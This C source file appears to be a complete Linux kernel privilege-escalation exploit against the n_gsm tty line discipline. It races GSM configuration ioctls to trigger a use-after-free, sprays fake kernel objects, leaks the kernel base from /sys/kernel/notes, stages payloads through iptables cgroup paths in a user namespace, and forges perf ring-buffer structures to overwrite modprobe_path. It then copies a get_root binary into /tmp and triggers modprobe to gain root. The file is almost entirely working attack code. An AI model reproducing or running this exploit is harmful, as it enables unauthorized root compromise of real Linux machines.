#define _GNU_SOURCE
#include <err.h>
#include <sys/types.h>
#include <signal.h>
#include <asm/types.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <termios.h>
#include <unistd.h>
#include <stdbool.h>
#include <linux/gsmmux.h>
#include <linux/tty.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>

#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include "spray.h"
struct gsm_dlci_config {
        __u32 channel;
        __u32 adaption;
        __u32 mtu;
        __u32 priority;
        __u32 i;
        __u32 k;
        __u32 flags;
        __u32 reserved[7];
};
#define GSMIOC_GETCONF_DLCI     _IOWR('G', 7, struct gsm_dlci_config)
#define GSMIOC_SETCONF_DLCI     _IOW('G', 8, struct gsm_dlci_config)
void die(char * message){
    printf("DIE : %s\n",message);
    exit(1);
}
static void set_core(int core)
{
        cpu_set_t set;

        CPU_ZERO(&set);
        CPU_SET(core, &set);

        if(sched_setaffinity(0, sizeof(set), &set)) die("sched_setaffinity failed, too few cores?");
}


// prepare payload


unsigned long kernel_base = 0;
unsigned long modprobe_path = 0 ;
unsigned long kernfs_pr_cont_buf = 0;
unsigned long __rb_free_aux = 0 ;
unsigned long perf_aux_output_end = 0;
static void prepare_smap_bypass(char *payload)
{
        pid_t pid;
        int fd;
        char buf[128];
        int a[2];
        int b[2];
        char c;
        char path[128];

        if(pipe(a) < 0) die("pipe");
        if(pipe(b) < 0) die("pipe");

        pid = fork();

        if(pid < 0) die("fork");

        if(pid == 0)
        {
                unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET);

                write(a[1], &c, 1);
                read(b[0], &c, 1);

                system("mount -t tmpfs tmpfs /run");

                fd = open("/dev/null", O_RDONLY);
                if(fd < 0) die("open");

                if(dup2(fd, 2) < 0) die("dup2");

                execl("/usr/sbin/iptables", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path", payload, "-j", "LOG", NULL);
                exit(1);
        }

        read(a[0], &c, 1);

        snprintf(path, sizeof path, "/proc/%u/setgroups", pid);

        fd = open(path, O_RDWR);
        if(!fd) die("open");

        strcpy(buf, "deny");

        if(write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
        close(fd);

        snprintf(path, sizeof path, "/proc/%u/uid_map", pid);

        fd = open(path, O_RDWR);
        if(fd < 0) die("open");

        snprintf(buf, sizeof buf, "0 %d 1", getuid());

        if(write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
        close(fd);

        snprintf(path, sizeof path, "/proc/%u/gid_map", pid);

        fd = open(path, O_RDWR);
        if(fd < 0) die("open");

        snprintf(buf, sizeof buf, "0 %d 1", getgid());

        if(write(fd, buf, strlen(buf)) != strlen(buf)) die("write");
        close(fd);

        write(b[1], &c, 1);

        close(a[0]);
        close(a[1]);
        close(b[0]);
        close(b[1]);

        wait(NULL);
}



void set_payload(char * payload, size_t size){

    //printf("try to setup kernfs_pr_cont_buf\n");
    char * tmp = malloc(size);
    for(int i = 0 ;i<size;i++){
        if(payload[i]==0){
            tmp[i] = '/';
        }else{
            tmp[i] = payload[i];
        }
    }
    prepare_smap_bypass(tmp);
    for(int i = size-1 ; i>0; i--){
        if(payload[i]==0){
            tmp[i]=0;
            prepare_smap_bypass(tmp);
        }
    }
    free(tmp);
}
// exploit

static struct gsm_config gsm_conf;
int master_fd,slave_fd;


bool g_success = false;


void RaceFunction2(void *);
void uaf_success(){

    //printf("uaf success. Let's try\n");

    g_success =true;
    spray_do();
    //printf("spray start %d\n",get_spray());
    sleep(2);
    //printf("mabye spray done\n");


    //printf("wakeup start\n");
    gsm_conf.initiator=1;
    ioctl(slave_fd, GSMIOC_SETCONF, &gsm_conf);
    close(slave_fd);
    //printf("wakeup done\n");
    sleep(30);
    spray_free();
    //printf("spray freed\n");
    exit(1);
}

void RaceFunction(void *){
    set_core(0);

    signal(SIGALRM, uaf_success);

    int l_slave = slave_fd;

    static struct gsm_dlci_config dlci_config;
    memset(&dlci_config,0,sizeof(struct gsm_dlci_config));
    dlci_config.channel = 2;
    dlci_config.flags  &= 1;

    if(ioctl(l_slave, GSMIOC_GETCONF_DLCI, &dlci_config)) die("set dlci conf\n");
    dlci_config.mtu=8;
    while(true){
        if(g_success){
            alarm(0);
            sleep(30);
            exit(1);
        }
        alarm(5);
        ioctl(l_slave, GSMIOC_SETCONF_DLCI, &dlci_config);
        alarm(0);
    }
}

void RaceFunction2(void *){
    set_core(1);
    while(1){
        gsm_conf.mtu^=0x20;
        ioctl(slave_fd, GSMIOC_SETCONF, &gsm_conf);
    }
}
#define NUM_THREADS 10
static void setup_tty()
{
    char *pts;
    int arg;
    int status;
    pthread_t threadID;

    spray_init_fuse_fs();
    size_t spray_size = 0x400;
    unsigned long * spray_buffer = malloc(spray_size);
    unsigned int * i_spray_buffer = spray_buffer;
    unsigned char * c_spray_buffer = spray_buffer;
    //fake gsm_dlci
    
    memset(spray_buffer,'\xde',spray_size);
    //gsm
    spray_buffer[0] = kernfs_pr_cont_buf;//0
    //status
    i_spray_buffer[3] = 0;//0x3
    

    //dlci->t1->function->entry->next
    spray_buffer[7] = 0xdeadbeef11223344;//0x38
    //gsm->dlci[0]->gsm->kick_timer->entry->pprev
    spray_buffer[8] = 0;//0x40
    
    spray_buffer[9] = 4294943360;//0x48
    
    //dlci->t1->function
    spray_buffer[10] = __rb_free_aux;//0x50
    spray_buffer[11] = 1;//0x58
    

    //__rb_free_aux in rb->free_aux => first pivot
    
    spray_buffer[0xb0/8  + 7 /*timer start offset*/] = 0;
    spray_buffer[0xC8/8  + 7 /*timer start offset*/] = perf_aux_output_end;

    spray_buffer[0xE0/8  + 7 /*timer start offset*/] = kernfs_pr_cont_buf + 0xf0; // __rb_free_aux in rb->aux_priv


    //ftype
    c_spray_buffer[0x20e] =  0xef; // switch (msg->ctrl & ~PF)  bypass
    //printf("spraying setup\n");


    system("mkdir /tmp/foo/  2>/dev/null && touch /tmp/foo/1");
    int try = 0;
    spray_setup((char * )spray_buffer,spray_size,5000);


    // set up sploit mux
    master_fd = open("/dev/ptmx", O_RDWR|O_CLOEXEC);
    if(master_fd < 0) die("open");

    if(grantpt(master_fd)) die("grantpt");
    if(unlockpt(master_fd)) die("unlockpt");

    pts = ptsname(master_fd);
    if(!pts) die("ptsname");

    slave_fd = open(pts, O_RDWR|O_CLOEXEC);

    if(slave_fd < 0) die("open");

    arg = N_GSM0710;
    if(ioctl(slave_fd, TIOCSETD, &arg)) die("ioctl");

    if(ioctl(slave_fd, GSMIOC_GETCONF, &gsm_conf)) die("getconf");

    gsm_conf.t2 = 2000;
    gsm_conf.t1 = 1;
    gsm_conf.n2 = 3;

    status = pthread_create(&threadID, NULL,(void *(*) (void *)) RaceFunction2, NULL);
    if (status != 0) {
        printf("Cannot create thread: %d\n", status);
        exit(1);
    }

    //printf("spawn race thread\n");
    for(int i =0 ;i<NUM_THREADS;i++){
        status = pthread_create(&threadID, NULL,(void *(*) (void *)) RaceFunction, (void *)NULL);
        if (status != 0) {
            printf("Cannot create thread: %d\n", status);
            break;
        }
    }
    //printf("exploit start\n");
    sleep(10000);
    exit(1);
}
unsigned long get_kernel_base(){
    const char *filePath = "/sys/kernel/notes";
    const char pattern[] = "Xen\x00";
    FILE *file;
    uint8_t buffer[1024];
    size_t bytesRead;
    int found = 0;

    file = fopen(filePath, "rb");
    if (!file) {
        perror("File open failed");
        return EXIT_FAILURE;
    }
    int count = 0;
    unsigned long hypercall_page=0;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0 && !found) {
        for (int i = 0; i < bytesRead - sizeof(pattern); ++i) {
            if (memcmp(buffer + i, pattern, sizeof(pattern) - 1) == 0) {
                if (i + sizeof(pattern) - 1 + 8 <= bytesRead) {
                    uint64_t value;
                    memcpy(&value, buffer + i + sizeof(pattern) - 1, 8);
                    if(value != 0xffffffff80000000 && (value &0xfff) == 0 && (value&0xffff000000000000)){
                        hypercall_page=value;
                        break;
                    }
                }
            }
        }
    }
    if(hypercall_page==0){
        printf("fail to get hypercall_page\n");
        exit(1);
    }
    kernel_base = hypercall_page - 0x1119000;
    modprobe_path = kernel_base + 0x23d8960;
    kernfs_pr_cont_buf = kernel_base +0x3910d00;
    __rb_free_aux = kernel_base + 0x37ac90;
    perf_aux_output_end = kernel_base + 0x37bf20;
    /*
    printf("hypercall_page: 0x%lx\n", hypercall_page);
    printf("kernel_base = 0x%lx\n",kernel_base);
    printf("modprobe_path = 0x%lx\n",modprobe_path);
    printf("__rb_free_aux = 0x%lx\n",__rb_free_aux);
    printf("kernfs_pr_cont_buf = 0x%lx\n",kernfs_pr_cont_buf);
    */
    fclose(file);
    return EXIT_SUCCESS;
}

void main(){
    system("echo '\xff\xff\xff\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    get_kernel_base();
    int status = 0;
    system("cp ./get_root /tmp/b");
    system("chmod +x /tmp/b");
    long * payload = malloc(0x200);
    memset(payload,'\x00',0x200);
    //gsm->tx_work
    payload[0x50/8] = 0xdeadbeefdeadbeef;
    //gsm->dlci[0]
    payload[0xb8/8] = kernfs_pr_cont_buf;


    //gsm->dlci[0]->gsm
    payload[0/8] =  kernfs_pr_cont_buf - 0x220;

    //gsm->dlci[0]->gsm->tx_lock
    payload[(0x2c0-0x220)/8]=0; // 0xa0

    //gsm->dlci[0]->gsm->tx_data_list
        //collision with stack pivot
    payload[(0x2d0-0x220)/8]= kernfs_pr_cont_buf+0x300;  // 0xb0

    
    //gsm->dlci[0]->gsm->tx_ctrl_list
    payload[(0x2e0-0x220)/8] = kernfs_pr_cont_buf+0x300; //0xc0



    //gsm->dlci[0]->gsm->kick_timer 0xc8
    //gsm->dlci[0]->gsm->kick_timer->entry->next
    payload[(0x2e8-0x220)/8] = 0xdeadbeef1234567;//0xc8
    //gsm->dlci[0]->gsm->kick_timer->entry->prev
    payload[(0x2e8-0x220 + 8)/8] = 0;//0xd0
    //gsm->dlci[0]->gsm->kick_timer->expire
    payload[(0x2e8-0x220 + 0x10)/8] = 4294943360;//0xd8

    //gsm->dlci[0]->gsm->kick_timer->function


    payload[(0x2e8-0x220 + 0x18)/8] = 0; //0xe0    do not trigger timer

    //gsm->dlci[0]->gsm->kick_timer->flags
    payload[(0x2e8-0x220 + 0x20)/8] = 1; // 0xe8
    //gsm->dlci[0]->gsm->t1
    payload[(0x388-0x220)/8]  = 4294943360; // 0x168


    //fake perf_output_handle 0xf0~0x120
        // 8 : rb
        // 32 : aux_flags
    int idx = 0xf0/8;
    payload[idx++] = kernfs_pr_cont_buf+0x3000; //0 -> event
    payload[idx++] = kernfs_pr_cont_buf+0x100;//0x8 -> rb 
    payload[idx++] = 0xdeadbeef1;//0x10   && rb->refcount
    payload[idx++] = 0xdeadbeef2;//0x18
    payload[idx++] = 0;//0x20 -> aux_flags
    payload[idx++] = 0x622f706d742f;//0x28 //AAW  value ??? why?
    payload[idx++] = 0xdeadbeef4;// 

    //fake rb
    
    payload[(0x100+0x90)/8] = 0x123123123; // rb->aux_head. write value... why it does not work
    payload[(0x100+0xb0)/8] = 0xffffffff00000000; // rb->aux_overwrite 0xb4
    payload[(0x100+0xe8)/8] = modprobe_path-0x420; // rb->user_page. write address
    payload[(0x100+0xd0)/8] = 0x123; // rb->aux_refcount


    // dot not use 0x168!! it is gsm->t1

    set_payload(payload,0x200);


    
    if(fork()==0){
        setup_tty();
    }
    //wait for exploit
    sleep(20);
    
    system("/tmp/dummy 2> /dev/null");
    execl("/tmp/c" , (char *) NULL);
}
